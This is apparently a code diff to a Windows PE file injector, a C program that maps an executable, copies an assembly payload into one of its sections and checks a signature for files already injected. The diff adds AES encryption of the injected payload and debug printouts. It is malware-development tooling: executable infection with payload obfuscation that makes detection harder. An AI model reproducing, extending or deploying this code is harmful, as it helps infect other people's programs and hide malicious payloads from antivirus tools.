@@ -1,23 +1,17 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <string.h>
+#include "encrypt.hpp"
+#include "libaes.h"
 #include "payload.h"
 #include "utils.h"
 
-// Extern declarations for the ASM payload (found in payload_{begin,end}.asm)
-EXTERN_C_START
-extern CONST BYTE __payload_start;  // Start of the payload
-extern CONST BYTE __payload_end;    // End of the payload
-extern CONST VOID payload();        // Payload entry point
-extern DWORD code_size;             // Size of the payload code
-extern LONGLONG delta_start;        // Delta between original and new entry points
-extern LONGLONG to_c_code;          // Offset from the payload to the C payload code (inj_code_c)
-#ifndef SKIP_SIGN
-extern CONST DWORD signature;  // Signature to check if the payload is already injected
-#endif                         // SKIP_SIGN
-EXTERN_C_END
-
 int main(int argc, char* argv[]) {
+    printf("Payload: %p\n", &__payload_start);
+    printf("Pl. enc: %p\n", &__payload_enc_start);
+    printf("Pl. end: %p\n", &__payload_end);
+    putchar('\n');
+
     int ret = 0;
     HANDLE hFile, hMapFile;
     LPVOID pMapAddress;
@@ -32,6 +26,8 @@ int main(int argc, char* argv[]) {
     PIMAGE_DOS_HEADER pDosHeaderRW;
     PIMAGE_NT_HEADERS64 pNtHeaderRW;
     PIMAGE_SECTION_HEADER pSectionRW, pLastSectionRW;
+    PBYTE pPayloadData;
+    SSIZE_T sszPayloadEncOffset;
     WORD wNbSections;
 #ifndef SKIP_SIGN
     DWORD dwSignature;
@@ -211,9 +207,28 @@ int main(int argc, char* argv[]) {
     printf("New payload:\n");
     HexDump(&__payload_start, dwPayloadSize);
 
-    memcpy((PBYTE)pDosHeaderRW + dwPayloadPtr, &__payload_start, dwPayloadSize);
+    pPayloadData = (PBYTE)pDosHeaderRW + dwPayloadPtr;
+
+    memcpy(pPayloadData, &__payload_start, dwPayloadSize);
 
     printf("[*] Injection complete!\n");
+
+    printf("[*] Encrypting payload...\n");
+    sszPayloadEncOffset = &__payload_enc_start - &__payload_start;
+    if (sszPayloadEncOffset < 0) {
+        printf("[!] Encrypted payload starts before the main payload\n");
+        ret = 1;
+        goto unmap;
+    }
+
+    if (EncryptPayload(pPayloadData + sszPayloadEncOffset, dwPayloadSize - sszPayloadEncOffset)) {
+        ret = 1;
+        goto unmap;
+    }
+
+    printf("[*] Done!\n");
+
+    HexDump(pPayloadData, dwPayloadSize);
 
     FlushViewOfFile(pMapAddress, 0);
 unmap:
